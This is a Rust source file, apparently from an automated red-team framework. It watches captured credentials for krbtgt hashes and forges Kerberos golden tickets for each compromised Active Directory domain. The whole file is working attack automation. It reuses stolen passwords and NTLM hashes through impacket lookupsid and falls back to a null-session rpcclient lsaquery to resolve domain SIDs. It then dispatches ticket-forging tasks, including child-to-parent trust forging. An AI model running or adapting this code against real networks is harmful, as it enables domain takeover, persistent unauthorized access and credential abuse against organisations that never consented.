//! auto_golden_ticket -- monitor for krbtgt hash and forge golden ticket.

use std::collections::HashSet;
use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{info, warn};

use crate::orchestrator::dispatcher::Dispatcher;

/// Monitors for krbtgt hash and triggers golden ticket forging.
/// Interval: 30s. Matches Python `_auto_golden_ticket`.
///
/// Multi-domain: a single op routinely captures krbtgt for >1 domain (child
/// then parent via ExtraSid; both forests via inter-realm forge). Each
/// domain needs its own forge dispatch — the dedup is per-domain via the
/// `golden_ticket_<domain>` exploited-vuln key, not the global
/// `has_golden_ticket` bool (which is kept only as a legacy aggregate).
pub async fn auto_golden_ticket(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // Snapshot the work queue: every distinct domain with a krbtgt
        // hash that hasn't already been forged. We resolve each one in
        // turn; SID lookups can issue tool calls and mutate state, so
        // we snapshot the list first under the read lock and release it.
        let pending_domains: Vec<String> = {
            let state = dispatcher.state.read().await;
            if !state.has_domain_admin {
                continue;
            }
            let mut seen = HashSet::new();
            let mut out = Vec::new();
            for h in &state.hashes {
                if !h.username.eq_ignore_ascii_case("krbtgt") {
                    continue;
                }
                let domain = if !h.domain.is_empty() {
                    h.domain.to_lowercase()
                } else if let Some(d) = state.domains.first() {
                    d.to_lowercase()
                } else {
                    continue;
                };
                if !seen.insert(domain.clone()) {
                    continue;
                }
                let vuln_id = format!("golden_ticket_{domain}");
                if state.exploited_vulnerabilities.contains(&vuln_id) {
                    continue;
                }
                out.push(domain);
            }
            out
        };

        for domain in pending_domains {
            try_forge_golden_ticket(&dispatcher, &domain).await;
        }
    }
}

/// Run a single forge attempt for `domain`. Called from the multi-domain
/// loop above; each call holds and releases its own state locks so a slow
/// SID lookup for one domain doesn't block the others.
async fn try_forge_golden_ticket(dispatcher: &Arc<Dispatcher>, domain: &str) {
    let domain_lc = domain.to_lowercase();

    let (krbtgt, mut domain_sid, dc_ip, admin_cred, admin_hash, lookup_cred) = {
        let state = dispatcher.state.read().await;

        let Some(krbtgt) = state
            .hashes
            .iter()
            .find(|h| {
                h.username.eq_ignore_ascii_case("krbtgt") && h.domain.to_lowercase() == domain_lc
            })
            .cloned()
        else {
            return;
        };

        let domain_sid = state.domain_sids.get(&domain_lc).cloned();
        let dc_ip = state.domain_controllers.get(&domain_lc).cloned();

        let admin_cred = state
            .credentials
            .iter()
            .find(|c| {
                c.username.to_lowercase() == "administrator" && c.domain.to_lowercase() == domain_lc
            })
            .cloned();
        let admin_hash = state
            .hashes
            .iter()
            .find(|h| {
                h.username.to_lowercase() == "administrator"
                    && h.domain.to_lowercase() == domain_lc
                    && h.hash_type.to_uppercase() == "NTLM"
            })
            .cloned();

        // Password credential for SID lookup. Prefer same-domain, fall
        // back to any non-quarantined cred — NTLM cross-domain auth
        // works via trust for lookupsid.
        let lookup_cred = state
            .credentials
            .iter()
            .find(|c| {
                c.domain.to_lowercase() == domain_lc
                    && !c.password.is_empty()
                    && !state.is_principal_quarantined(&c.username, &c.domain)
            })
            .or_else(|| {
                state.credentials.iter().find(|c| {
                    !c.password.is_empty()
                        && !state.is_principal_quarantined(&c.username, &c.domain)
                })
            })
            .cloned();

        (
            krbtgt,
            domain_sid,
            dc_ip,
            admin_cred,
            admin_hash,
            lookup_cred,
        )
    };

    // ── Resolve domain SID if not cached ────────────────────────────
    if domain_sid.is_none() {
        if let Some(ref target_ip) = dc_ip {
            let result =
                resolve_domain_sid(domain, target_ip, lookup_cred.as_ref(), admin_hash.as_ref())
                    .await;

            if let Some((ref sid, ref admin_name)) = result {
                info!(domain = %domain, sid = %sid, admin = admin_name.as_deref().unwrap_or("Administrator"), "Domain SID resolved via lookupsid");
                let op_id = { dispatcher.state.read().await.operation_id.clone() };
                let reader = ares_core::state::RedisStateReader::new(op_id);
                let mut conn = dispatcher.queue.connection();
                if let Err(e) = reader.set_domain_sid(&mut conn, &domain_lc, sid).await {
                    warn!(err = %e, "Failed to persist domain SID to Redis");
                }
                if let Some(ref name) = admin_name {
                    if let Err(e) = reader.set_admin_name(&mut conn, &domain_lc, name).await {
                        warn!(err = %e, "Failed to persist admin name to Redis");
                    }
                }
                let mut state = dispatcher.state.write().await;
                state.domain_sids.insert(domain_lc.clone(), sid.clone());
                if let Some(ref name) = admin_name {
                    state.admin_names.insert(domain_lc.clone(), name.clone());
                }
            }

            domain_sid = result.map(|(sid, _)| sid);
        }
    }

    let domain_sid = match domain_sid {
        Some(sid) => sid,
        None => {
            warn!(domain = %domain, "Cannot resolve domain SID — skipping golden ticket");
            return;
        }
    };

    let admin_username = {
        let state = dispatcher.state.read().await;
        state
            .admin_names
            .get(&domain_lc)
            .cloned()
            .unwrap_or_else(|| "Administrator".to_string())
    };

    // ── Build and submit golden ticket task ─────────────────────────
    // Strip LM prefix if hash is in "lm:ntlm" format — ticketer expects
    // a single 32-char NTLM hex string, not the LM:NTLM pair.
    let ntlm_hash = match krbtgt.hash_value.rsplit_once(':') {
        Some((_, ntlm)) if ntlm.len() == 32 => ntlm.to_string(),
        _ => krbtgt.hash_value.clone(),
    };

    let mut payload = json!({
        "technique": "golden_ticket",
        "vuln_type": "golden_ticket",
        "domain": domain,
        "krbtgt_hash": ntlm_hash,
        "username": admin_username,
        "domain_sid": domain_sid,
    });
    if let Some(ip) = dc_ip {
        payload["dc_ip"] = json!(ip);
    }
    if let Some(ref cred) = admin_cred {
        payload["admin_password"] = json!(cred.password);
        payload["admin_domain"] = json!(cred.domain);
    }
    if let Some(ref hash) = admin_hash {
        payload["admin_hash"] = json!(hash.hash_value);
        payload["admin_domain"] = json!(admin_cred.as_ref().map_or(&hash.domain, |c| &c.domain));
    }
    if let Some(ref aes) = krbtgt.aes_key {
        payload["aes_key"] = json!(aes);
    }

    match dispatcher
        .throttled_submit("exploit", "privesc", payload, 1)
        .await
    {
        Ok(Some(task_id)) => {
            info!(task_id = %task_id, domain = %domain, "Golden ticket task dispatched");
            // Mark per-domain immediately to prevent re-dispatch on the
            // next 30s tick. Result processing also confirms on task
            // completion (detects "Saving ticket in *.ccache" in output).
            if let Err(e) = dispatcher
                .state
                .set_golden_ticket(&dispatcher.queue, domain)
                .await
            {
                warn!(err = %e, "Failed to set golden ticket flag after dispatch");
            }
        }
        Ok(None) => {}
        Err(e) => warn!(err = %e, "Failed to dispatch golden ticket"),
    }
}

/// Resolve domain SID and RID-500 account name by calling `impacket-lookupsid`.
/// Returns `(domain_sid, Option<admin_name>)`. Tries password credential first,
/// then NTLM hash.
///
/// Uses the credential's own domain for NTLM auth (not the target domain) so
/// cross-domain trust authentication works — e.g. a `child.contoso.local`
/// cred can resolve the SID of `contoso.local` via its parent DC.
pub(crate) async fn resolve_domain_sid(
    _domain: &str,
    dc_ip: &str,
    password_cred: Option<&ares_core::models::Credential>,
    admin_hash: Option<&ares_core::models::Hash>,
) -> Option<(String, Option<String>)> {
    // Try password auth first — use the credential's native domain for auth
    if let Some(cred) = password_cred {
        let auth_domain = if cred.domain.is_empty() {
            _domain
        } else {
            &cred.domain
        };
        let args = json!({
            "domain": auth_domain,
            "username": cred.username,
            "password": cred.password,
            "dc_ip": dc_ip,
        });
        match ares_tools::privesc::get_sid(&args).await {
            Ok(output) => {
                let text = output.combined_raw();
                if let Some(sid) = ares_core::parsing::extract_domain_sid(&text) {
                    let admin_name = ares_core::parsing::extract_rid500_name(&text);
                    return Some((sid, admin_name));
                }
                warn!(auth_domain = %auth_domain, user = %cred.username, "lookupsid succeeded but no SID pattern found in output");
            }
            Err(e) => {
                warn!(err = %e, user = %cred.username, auth_domain = %auth_domain, "lookupsid with password failed");
            }
        }
    }

    // Fall back to hash auth — use the hash's native domain for auth
    if let Some(hash) = admin_hash {
        let auth_domain = if hash.domain.is_empty() {
            _domain
        } else {
            &hash.domain
        };
        let args = json!({
            "domain": auth_domain,
            "username": "Administrator",
            "hash": hash.hash_value,
            "dc_ip": dc_ip,
        });
        match ares_tools::privesc::get_sid(&args).await {
            Ok(output) => {
                let text = output.combined_raw();
                if let Some(sid) = ares_core::parsing::extract_domain_sid(&text) {
                    let admin_name = ares_core::parsing::extract_rid500_name(&text);
                    return Some((sid, admin_name));
                }
                warn!(auth_domain = %auth_domain, "lookupsid (hash) succeeded but no SID pattern found");
            }
            Err(e) => {
                warn!(err = %e, auth_domain = %auth_domain, "lookupsid with admin hash failed");
            }
        }
    }

    // Final fallback: null-session LSARPC lsaquery. Authenticated impacket
    // cross-domain lookupsid (child-domain creds against the parent DC)
    // routinely fails — impacket's Kerberos referral chain is buggy
    // (fortra/impacket#315) and NTLM cross-domain auth gets rejected by
    // hardened DCs. But `rpcclient -U "" -N <dc_ip> -c "lsaquery"` over a
    // null session usually succeeds against any DC that allows anonymous
    // LSA queries — which is most legacy/lab AD deployments. The output is
    // parsed by `extract_lsaquery_domain_sid`. This unblocks the
    // child→parent forge path in `auto_trust_follow` when authenticated
    // lookupsid against the parent DC fails.
    match tokio::process::Command::new("rpcclient")
        .arg("-U")
        .arg("")
        .arg("-N")
        .arg(dc_ip)
        .arg("-c")
        .arg("lsaquery")
        .output()
        .await
    {
        Ok(out) => {
            let combined = format!(
                "{}\n{}",
                String::from_utf8_lossy(&out.stdout),
                String::from_utf8_lossy(&out.stderr)
            );
            if let Some((_flat, sid)) = ares_core::parsing::extract_lsaquery_domain_sid(&combined) {
                info!(dc_ip = %dc_ip, sid = %sid, "Resolved domain SID via null-session lsaquery fallback");
                return Some((sid, None));
            }
            warn!(dc_ip = %dc_ip, "Null-session lsaquery returned no parseable SID");
        }
        Err(e) => {
            warn!(err = %e, dc_ip = %dc_ip, "Failed to invoke rpcclient for null-session lsaquery");
        }
    }

    None
}
